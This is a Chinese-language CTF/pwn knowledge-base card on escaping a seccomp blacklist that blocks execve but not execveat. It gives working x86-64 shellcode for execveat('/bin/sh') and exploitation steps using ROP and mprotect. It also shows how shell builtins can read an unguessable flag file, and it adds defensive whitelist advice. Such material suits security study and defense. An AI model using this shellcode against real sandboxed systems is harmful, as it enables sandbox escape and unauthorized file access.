---
id: binary-pwn-sandbox-escape-seccomp-execveat-shell-builtin-read
title: seccomp 黑名单漏掉 execveat：execveat(AT_FDCWD, /bin/sh) 绕过 execve 禁用，再用 shell 内建读未知文件名 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: seccomp-execveat-shell-builtin-read
tags:
- pwn
- seccomp
- sandbox-escape
- shellcode
- execveat
- execve
- shell-builtin
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V263
  verified_at: '2026-11-07T17:48:18+08:00'
  notes: V263 复核：本文无图片，已完整重读 content.md 与完整 exp。seccomp BPF 逐行核对：仅禁 fork(57)/execve(59)/vfork(58)/open(2)/creat(85)，其余 ALLOW，未列 execveat(322)；卡内 shellcode（rax=322、rdi=AT_FDCWD(-100)、rsi="/bin/sh"、rdx/r10/r8=0）与原文 asm 一致；后利用 echo * 与 read line < 文件名; echo $line 绕过外部命令的 fork/execve，与原文“shell bypass Seccomp Sandbox”段一致，远程不可猜文件名 cant_guess_me_f14G.txt 亦与原文相符。affected_versions 为空：原文未给组件/内核版本，条件由过滤器内容决定。dedup：最高分为卡自身 exact；second candidate binary-pwn-sandbox-escape-seccomp-no-arch-check-i386-compat-execve 为 likely_duplicate（cos 0.9312），核对后两者绕过点不同——该卡利用未校验 arch 用 retfd 切 i386 执行 int 0x80 execve(11)，本卡利用黑名单漏 execveat(322) 在 x86-64 直接绕过，仅共享 shell 内建读未知文件名 flag 的尾部技巧，非同一条利用链，保留两卡。未复跑；frontmatter 无 sources/source（符合禁用要求），亦无 source_url。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-seccomp-execveat-shell-builtin-read/
draft: false
kb_aliases:
- execveat 绕过 seccomp
- seccomp 禁 execve 但放行 execveat
- 无 execve 读 flag
- shell 内建 echo 星号
- read 重定向读文件
- seccomp 黑名单遗漏系统调用
---

## 一句话结论

当 seccomp 黑名单只禁 `fork`/`execve`/`vfork`/`open`/`creat` 却漏掉 `execveat` 时，shellcode 直接执行 `execveat(AT_FDCWD, "/bin/sh", NULL, NULL, 0)`（x86-64 syscall 322）即可拉起 shell；拿到 shell 后所有外部命令仍会触发被禁的 `execve`，改用 shell 内建 `echo *` 列目录、`read line < 文件; echo $line` 读内容，即使 flag 文件名不可猜也能读出来。

## 原理

- **seccomp 黑名单按系统调用号精确匹配**：示例过滤器先检查 `arch == AUDIT_ARCH_X86_64`，然后对 `fork`(57)、`execve`(59)、`vfork`(58)、`open`(2)、`creat`(85) 返回 KILL，其余 ALLOW。它没有列出 `execveat`(322)，因此该路径被放行。
- **`execveat` 与 `execve` 语义等价**：`execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags)` 在 `dirfd=AT_FDCWD(-100)`、`flags=0` 且 `pathname` 为普通路径时，行为与 `execve(pathname, argv, envp)` 相同。黑名单只堵了 `execve` 这个名字对应的编号，没有堵同功能的 `execveat`，于是可以直接执行 `/bin/sh`。
- **为什么不能直接 openat+sendfile**：黑名单放行了 `openat`、`sendfile`，若已知 flag 文件名，ORW shellcode 可绕过；但题目远程把 flag 改成不可猜的名字，无法在 shellcode 里硬编码路径，只能先拿到 shell 再动态发现文件名。
- **为什么外部命令都不能用**：`ls`、`cat`、`grep` 等命令由 shell `fork` + `execve` 启动，二者都在黑名单里，执行会被 KILL。必须只用 shell 内建（builtin），它们不创建新进程、不调用 `execve`。
- **`echo *` 的目录枚举**：glob 展开由 shell 自己完成（内部使用 `readdir`/`getdents` 类调用并 `write` 输出），不需要 `execve`，因此能列出当前目录下所有文件名，解决“flag 文件名未知”。
- **`read line < file` 的文件读取**：重定向由 shell 用 `openat`（x86-64 号 257，未被禁）打开文件，`read` 是内建，把一行读入变量，`echo $line` 再由内建输出；全程不触发 `execve`/`open`。
- **边界**：若过滤器额外禁 `execveat`、或者用白名单而非黑名单、或者 shell 的重定向使用 `open`(2) 而不是 `openat`(257)，该后利用路径会失败。

## 触发条件

- seccomp 黑名单覆盖 `execve` 但未覆盖 `execveat`（或等价地放行了 syscall 322），且允许 `execveat` 所需的路径解析。
- 目标为 x86-64 Linux，内核支持 `execveat`（Linux 3.19+），存在可执行的 `/bin/sh` 或等价 shell。
- 攻击者已能执行自定义 shellcode（如通过 ROP `mprotect` 把堆页改为 RWX，或已有 RWX 段）。
- 拿 shell 后仍处于同一 seccomp 过滤器下；shell 的重定向走 `openat`，`read`/`write` 未被禁。

## 利用步骤

1. `seccomp-tools dump ./target` 导出 BPF，确认黑名单具体系统调用号：本例为 57/58/59/2/85，确认 322（`execveat`）与 257（`openat`）未被禁。
2. 用 ROP 调 `mprotect(heap_base, 0x3000, 7)`（或 `mmap` 一块 RWX 页），把 shellcode 放到可执行内存。
3. 写入 `execveat` shellcode：`rax=322`、`rdi=-100`（`AT_FDCWD`）、`rsi` 指向栈上的 `"/bin/sh\0"`、`rdx=0`（argv）、`r10=0`（envp）、`r8=0`（flags），`syscall`。
4. 跳转执行 shellcode，进入 `/bin/sh`。
5. 先执行 `echo *`，列出当前目录（含 flag 文件）的名字；不要用 `ls`。
6. 执行 `read line < <文件名>; echo $line` 读取文件内容；不要用 `cat`。
7. 若 `read` 重定向失败，检查 shell 是否改用 `open`(2)；可换成 `exec 3< file; read line <&3; echo $line` 或直接用放行的 `openat` 写 ORW shellcode。

## PoC

```asm
; x86-64 shellcode：execveat(AT_FDCWD, "/bin/sh", NULL, NULL, 0)
xor rsi, rsi
push rsi
mov rdi, 0x68732f6e69622f   ; "/bin/sh"
push rdi
mov rsi, rsp
push -100                   ; AT_FDCWD
pop rdi
xor rdx, rdx                ; argv = NULL
xor r10, r10                ; envp = NULL
xor r8, r8                  ; flags = 0
mov rax, 322                ; __NR_execveat
syscall
```

```python
from pwn import *
context.arch = "amd64"
shellcode = asm("""
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rsi, rsp
    push -100
    pop rdi
    xor rdx, rdx
    xor r10, r10
    xor r8, r8
    mov rax, 322
    syscall
""")
# 前置：ROP 已执行 mprotect(heap, 0x3000, 7)，并将 shellcode 写入该堆页
```

进入 shell 后：

```bash
echo *
read line < cant_guess_me_f14G.txt; echo $line
```

## 变体与关联

- 变体：若过滤器连 `execveat` 也禁，改用 `openat2`/`openat` + `read`/`write` 的 ORW shellcode（需要已知文件名），或 `sendfile` 把文件内容送到 stdout。
- 变体：若黑名单没校验 `arch`，可用 32 位 `retf` 切 i386 兼容模式，用 `int 0x80` 的 `execve`(11) 绕过；见 [[binary-pwn-sandbox-escape-seccomp-no-arch-check-i386-compat-execve]]。
- 变体：若禁止 `open` 但放行 `openat2`，可用 `openat2` + `pipe`/`splice` 读文件，见 [[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]。
- 关联：[[binary-pwn-sandbox-escape-seccomp-no-arch-check-i386-compat-execve]] 与本卡共用“shell 内建 `echo *` / `read` 读未知文件名 flag”的后利用技巧，但绕过点不同（那篇是 arch 未校验 + i386 ABI，本篇是黑名单漏 `execveat`）。
- 关联：[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]（mprotect 改 RWX 后跳 shellcode 的前置）。

## 检测与防御

- **seccomp 应优先白名单**：黑名单天然会漏同语义系统调用（`execve` vs `execveat`、`open` vs `openat` vs `openat2`）。应只放行必要 syscall，并按参数限制。
- **补齐黑名单**：至少把 `execveat`(322) 与 `execve`(59) 一起禁；若还要防 ORW，需同时禁 `openat`/`openat2`/`sendfile`/`splice`/`read` 等，或改用只允许 `write` 的极简白名单。
- **校验 arch 并封 32 位路径**：加载 `seccomp_data.arch` 与 `AUDIT_ARCH_X86_64` 比较；不需要兼容 32 位时关闭 `CONFIG_IA32_EMULATION`。
- **检测**：seccomp 日志中出现被拦截的 `execve` 与随后出现的 shell 交互（`echo *`、`read ... < ...`）是异常信号；监控进程在禁 `execve` 后仍出现 `/bin/sh` 进程（若通过 `execveat` 成功）。
- 防御方注意：仅靠 seccomp 黑名单无法阻止“换一个同功能 syscall”；必须采用白名单 + 参数过滤，并对 CTF 类服务限制可执行文件与文件系统可见范围。
